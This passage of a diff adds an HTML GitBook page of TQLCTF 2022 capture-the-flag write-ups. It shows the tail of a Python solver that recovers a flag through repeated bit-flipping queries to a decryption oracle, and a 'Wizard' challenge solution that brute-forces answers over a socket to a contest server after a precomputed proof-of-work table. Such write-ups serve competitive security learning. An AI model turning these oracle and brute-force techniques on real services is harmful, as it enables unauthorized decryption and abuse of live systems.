+    midmess=bytearray(<span class="hljs-string">b&quot;\x00&quot;</span>*len(tox))
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(tox)):
+        midmess[i]=midmesstx[xorder[i]]
+
+    print(midmess.hex())
+
+    missbpos=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(tox)+<span class="hljs-number">4</span>) <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> xorder]
+    missb=[bytes([midmesstx[i]]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> missbpos]
+
+    print(<span class="hljs-string">b&quot;&quot;</span>.join(missb).hex())
+
+    <span class="hljs-keyword">return</span> (tox,mess,midmess,missb,xorder,missbpos)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shufflefrombits</span><span class="hljs-params">(arr, bits)</span>:</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> reversed(range(<span class="hljs-number">1</span>,len(arr))):
+        blx=i+<span class="hljs-number">1</span>
+        <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+            k=blx.bit_length()
+            ns=(bits%(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>))&gt;&gt;(<span class="hljs-number">32</span>-k)
+            bits&gt;&gt;=<span class="hljs-number">32</span>
+            <span class="hljs-keyword">assert</span> bits!=<span class="hljs-number">0</span>
+            <span class="hljs-keyword">if</span> ns&lt;blx:
+                <span class="hljs-keyword">break</span>
+        arr[i],arr[ns]=arr[ns],arr[i]
+    <span class="hljs-keyword">return</span> arr,bits
+
+i=<span class="hljs-number">0</span>
+mlen=len(flagm)*<span class="hljs-number">4</span>
+
+porder=[<span class="hljs-number">-1</span>]*(mlen//<span class="hljs-number">8</span><span class="hljs-number">-4</span>)
+dangpos=[<span class="hljs-keyword">False</span>]*(mlen//<span class="hljs-number">8</span><span class="hljs-number">-4</span>)
+
+<span class="hljs-keyword">while</span> i&lt;(mlen<span class="hljs-number">-8</span>*<span class="hljs-number">4</span>):
+    gm=hex2ba(flagm)
+    gm[i]^=<span class="hljs-number">1</span>
+    gm=ba2hex(gm)
+    pst,pv=querydecrypt(gm)
+    print(i,pst,pv)
+    <span class="hljs-keyword">if</span> pst==<span class="hljs-number">2</span>:
+        dangpos[i//<span class="hljs-number">8</span>]=<span class="hljs-keyword">True</span>
+    <span class="hljs-keyword">if</span> pst==<span class="hljs-number">1</span>:
+        porder[i//<span class="hljs-number">8</span>]=pv
+    <span class="hljs-keyword">if</span> porder[i//<span class="hljs-number">8</span>]!=<span class="hljs-number">-1</span> <span class="hljs-keyword">and</span> dangpos[i//<span class="hljs-number">8</span>]:
+        i=(i+<span class="hljs-number">8</span>)//<span class="hljs-number">8</span>*<span class="hljs-number">8</span>
+        <span class="hljs-keyword">continue</span>
+    i+=<span class="hljs-number">1</span>
+
+print(porder)
+print(dangpos)
+
+xorder=[<span class="hljs-number">-1</span>]*(mlen//<span class="hljs-number">8</span><span class="hljs-number">-8</span>)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(mlen//<span class="hljs-number">8</span><span class="hljs-number">-4</span>):
+    <span class="hljs-keyword">if</span> dangpos[i]:
+        xorder[porder[i]]=i
+
+midmesstx=bytes.fromhex(flagm)
+midmess=bytearray(<span class="hljs-string">b&quot;\x00&quot;</span>*(mlen//<span class="hljs-number">8</span><span class="hljs-number">-8</span>))
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(mlen//<span class="hljs-number">8</span><span class="hljs-number">-8</span>):
+    midmess[i]=midmesstx[xorder[i]]
+
+print(midmess.hex())
+
+missbpos=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(mlen//<span class="hljs-number">8</span><span class="hljs-number">-4</span>) <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> xorder]
+missb=[bytes([midmesstx[i]]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> missbpos]
+
+print(<span class="hljs-string">b&quot;&quot;</span>.join(missb).hex())
+
+prepl=getmid(<span class="hljs-string">&apos;1&apos;</span>*(mlen*<span class="hljs-number">6</span>))
+
+<span class="hljs-keyword">for</span> nttoken <span class="hljs-keyword">in</span> itertools.permutations(missb):
+    ntoken=list(nttoken)
+    crmess=bytearray(bytes.fromhex(prepl[<span class="hljs-number">1</span>]))
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">4</span>):
+        crmess[prepl[<span class="hljs-number">5</span>][i]]=ntoken[i][<span class="hljs-number">0</span>]
+    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+        nst,nps=querydecrypt(bytes(crmess).hex())
+        print(nst,nps)
+        <span class="hljs-keyword">if</span> nst!=<span class="hljs-number">1</span>:
+            <span class="hljs-keyword">break</span>
+        cpa=prepl[<span class="hljs-number">4</span>][nps]
+        <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+            crmess[cpa]=random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">255</span>)
+            nstx,npsx=querydecrypt(bytes(crmess).hex())
+            print(<span class="hljs-string">&quot;ret&quot;</span>,nstx,npsx)
+            <span class="hljs-keyword">if</span> npsx!=nps:
+                <span class="hljs-keyword">break</span>
+    ashf=[]
+    xrandbits=[]
+    rdbhex=<span class="hljs-string">&quot;&quot;</span>
+    els=<span class="hljs-keyword">False</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(crmess)<span class="hljs-number">-8</span>):
+        shfpos=[<span class="hljs-number">-1</span>]*<span class="hljs-number">8</span>
+        spos=prepl[<span class="hljs-number">4</span>][i]
+        <span class="hljs-keyword">while</span> shfpos.count(<span class="hljs-number">-1</span>)&gt;<span class="hljs-number">1</span>:
+            lasmess=querydecrypt(bytes(crmess).hex())[<span class="hljs-number">1</span>]
+            pendingl=[j <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>) <span class="hljs-keyword">if</span> shfpos[j]==<span class="hljs-number">-1</span>]
+            random.shuffle(pendingl)
+            <span class="hljs-comment">#print(pendingl,lasmess,shfpos)</span>
+            <span class="hljs-keyword">for</span> nxpos <span class="hljs-keyword">in</span> pendingl:
+                crmess[spos]^=<span class="hljs-number">1</span>&lt;&lt;nxpos
+                qst,qps=querydecrypt(bytes(crmess).hex())
+                <span class="hljs-keyword">if</span> qst==<span class="hljs-number">1</span>:
+                    crmess[spos]^=<span class="hljs-number">1</span>&lt;&lt;nxpos
+                    <span class="hljs-keyword">continue</span>
+                rposv=ord(qps[i])^ord(lasmess[i])
+                rpos=rposv.bit_length()<span class="hljs-number">-1</span>
+                <span class="hljs-keyword">assert</span> rposv==<span class="hljs-number">1</span>&lt;&lt;rpos
+                shfpos[nxpos]=rpos
+                <span class="hljs-keyword">if</span> ((<span class="hljs-number">97</span>&gt;&gt;rpos)&amp;<span class="hljs-number">1</span>)!=((ord(qps[i])&gt;&gt;rpos)&amp;<span class="hljs-number">1</span>):
+                    crmess[spos]^=<span class="hljs-number">1</span>&lt;&lt;nxpos
+                <span class="hljs-keyword">break</span>
+        highpos=shfpos.index(<span class="hljs-number">-1</span>)
+        shfpos[highpos]=<span class="hljs-number">7</span>
+        ashf.append(shfpos)
+
+        nbit=crmess[spos]
+        gv=<span class="hljs-number">0</span>
+        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):
+            gv|=((nbit&gt;&gt;j)&amp;<span class="hljs-number">1</span>)&lt;&lt;shfpos[j]
+        rv=gv^<span class="hljs-number">97</span>
+        xrandbits.append(rv)
+        rdbhex+=hex(rv)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>)
+        print(len(set(shfpos)),shfpos,lasmess,hex(rv))
+        <span class="hljs-keyword">if</span> i==len(flagm)//<span class="hljs-number">2</span>+<span class="hljs-number">128</span>:
+            rdb=bytes.fromhex(rdbhex)
+            plen=len(flagm)//<span class="hljs-number">2</span><span class="hljs-number">-8</span>
+            dqq=(plen+<span class="hljs-number">3</span>)//<span class="hljs-number">4</span>*<span class="hljs-number">4</span>
+            xorv=rdb[:dqq]
+            xorv=xorv[:dqq<span class="hljs-number">-4</span>]+xorv[-(plen-dqq+<span class="hljs-number">4</span>):]
+            print(xorv.hex())
+            entr=int.from_bytes(rdb[dqq:],<span class="hljs-string">&apos;little&apos;</span>)
+            s = bin(midmess[<span class="hljs-number">0</span>])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)
+            idx = list(range(<span class="hljs-number">8</span>))
+            idx,nst=shufflefrombits(idx, entr)
+            s = <span class="hljs-string">&apos;&apos;</span>.join([s[idx.index(i)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>)])
+            emm=int(s, <span class="hljs-number">2</span>)^xorv[<span class="hljs-number">0</span>]
+            print(<span class="hljs-string">&quot;CHECK&quot;</span>,emm)
+        <span class="hljs-comment"># if i==6 and not(0xda in xrandbits and 0x15 in xrandbits and 0x2c in xrandbits):</span>
+        <span class="hljs-comment">#     els=True</span>
+        <span class="hljs-comment">#     break</span>
+
+    <span class="hljs-keyword">if</span> els:
+        print(<span class="hljs-string">&quot;elstop&quot;</span>)
+        <span class="hljs-keyword">continue</span>
+
+    rdb=bytes.fromhex(rdbhex)
+    print(rdbhex)
+    plen=len(flagm)//<span class="hljs-number">2</span><span class="hljs-number">-8</span>
+    dqq=(plen+<span class="hljs-number">3</span>)//<span class="hljs-number">4</span>*<span class="hljs-number">4</span>
+    xorv=rdb[:dqq]
+    xorv=xorv[:dqq<span class="hljs-number">-4</span>]+xorv[-(plen-dqq+<span class="hljs-number">4</span>):]
+    print(xorv.hex())
+    entr=int.from_bytes(rdb[dqq:],<span class="hljs-string">&apos;little&apos;</span>)
+    np=bytearray()
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(plen):
+        s = bin(midmess[i])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)
+        idx = list(range(<span class="hljs-number">8</span>))
+        idx,nst=shufflefrombits(idx, entr)
+        entr=nst
+        s = <span class="hljs-string">&apos;&apos;</span>.join([s[idx.index(i)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>)])
+        np.append(int(s, <span class="hljs-number">2</span>)^xorv[i])
+    flagx=bytes(np)
+    print(flagx)
+
+    <span class="hljs-comment">#break</span>
+</code></pre>
+<h2 id="misc-wizard">[misc] Wizard</h2>
+<p>&#x53EF;&#x80FD;&#x662F;&#x5168;&#x573A;&#x9664;&#x4E86;&#x7B7E;&#x5230;&#x9898;&#x4E4B;&#x5916;&#x6700;&#x6C34;&#x7684;&#x9898;&#x3002;</p>
+<p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x51E0;&#x4EF6;&#x4E8B;&#x60C5;&#xFF1A;</p>
+<ul>
+<li>&#x7B54;&#x6848; $k$ &#x4E00;&#x5B9A;&#x6EE1;&#x8DB3; $1 \leq k \leq m, k \in \mathbb{Z}$</li>
+<li>&#x624B;&#x73A9;&#x51E0;&#x6B21;&#xFF0C;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x8FD9;&#x4E2A; $m$ &#x4F3C;&#x4E4E;&#x4E0D;&#x4F1A;&#x592A;&#x5927;&#x3002;&#x867D;&#x7136;&#x9898;&#x76EE;&#x6570;&#x636E;&#x8303;&#x56F4;&#x91CC;&#x89C4;&#x5B9A;&#x4E86; $1 \leq m \leq 10000$ &#x4E0D;&#x8FC7;&#x5B9E;&#x9645;&#x4E0A; $m$ &#x76EE;&#x6D4B;&#x4E5F;&#x5C31;&#x662F; $500$ &#x7684;&#x6837;&#x5B50;</li>
+</ul>
+<p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x66B4;&#x529B;&#x5C1D;&#x8BD5;&#x3002;&#x6BCF;&#x6B21;&#x4EA4;&#x4E92;&#x7684;&#x65F6;&#x5019;&#x968F;&#x673A;&#x9009;&#x4E00;&#x4E2A; $k, k \in [1,m] \cap \mathbb{Z}$&#x3002;&#x4E94;&#x5206;&#x949F;&#x5373;&#x53EF;&#x51FA;&#x7ED3;&#x679C;&#x3002;</p>
+<p>&#x5BF9;&#x4E86;&#xFF0C;&#x8FD9;&#x9053;&#x9898;&#x7684; POW &#x7684;&#x5DE5;&#x4F5C;&#x91CF;&#x4F3C;&#x4E4E;&#x592A;&#x5C0F;&#x4E86;&#x3002;POW &#x662F; <code>SHA256(&apos;TQLCTF&apos; + ?) starts with 836c1. Please input the string:</code>&#x3002;&#x4E0D;&#x96BE;&#x53D1;&#x73B0;&#xFF0C;&#x53EA;&#x6709; $16^5 = 1048576$ &#x79CD;&#x60C5;&#x51B5;&#xFF0C;&#x76F4;&#x63A5;&#x6253;&#x4E2A;&#x8868;&#x5C31;&#x884C;&#x4E86;&#x3002;</p>
+<p>&#x8FD9;&#x662F;&#x7A0B;&#x5E8F;&#xFF1A;</p>
+<pre><code class="lang-python=">import socket
+import time
+import random
+import hashlib
+
+class IntSocket:
+    def __init__(self,ip,port,debug=True,delay=4):
+        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.s.connect((ip,port))
+        self.ip = ip
+        self.port = port
+        self.debug = debug
+        self.delay = delay
+
+    def Reset(self):
+        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.s.connect((self.ip,self.port))
+
+    def Recv(self):
+        data = self.s.recv(2048).decode()
+        if self.debug: print(&quot;&gt;]&quot;,data)
+        time.sleep(self.delay/1000)
+        return data
+
+    def Send(self,data):
+        if self.debug: print(&quot;&lt;]&quot;,data)
+        self.s.send((data+&apos;\n&apos;).encode(&apos;utf-8&apos;))
+        time.sleep(self.delay/1000)
+
+# Brute - Based on table
+table = [&apos;&apos; for i in range(1048576)]
+def Load():
+    with open(&apos;table.txt&apos;,&apos;r&apos;) as f:
+        for line in f.readlines():
+            id = int(line.split()[0])
+            st = line.strip().split()[1]
+            table[id] = st
+Load()
+def Find2(startWith):
+    id = int(startWith,16)
+    return table[id]
+
+sock = IntSocket(&quot;120.79.12.160&quot;,37987)
+counter = 0
+while True:
+    counter += 1
+    sock.Reset()
+
+    msg = sock.Recv()
+    sock.Send(Find2(msg.split(&apos;\n&apos;)[0].split()[-1]))
+
+    msg = sock.Recv()
+    m = int(msg.strip().split(&apos;\n&apos;)[-1].split()[-1])
+    sock.Send(&apos;G &apos;+str(random.randint(1,m)))
+
+    msg = sock.Recv()
+    if &apos;You are wrong! You can not get Zard\&apos;s secret&apos; not in msg:
+        break
+
+    print(&apos;[Counter]&apos;,counter)
+</code></pre>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="20220306-D^3CTF.html" class="navigation navigation-prev navigation-unique" aria-label="Previous page: D^3CTF 2022">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"TQLCTF 2022","level":"1.2.4","depth":2,"previous":{"title":"D^3CTF 2022","level":"1.2.3","depth":2,"path":"writeups/20220306-D^3CTF.md","ref":"writeups/20220306-D^3CTF.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"writeups/20220220-TQLCTF.md","mtime":"2022-07-09T12:53:13.847Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-07-09T12:53:47.086Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
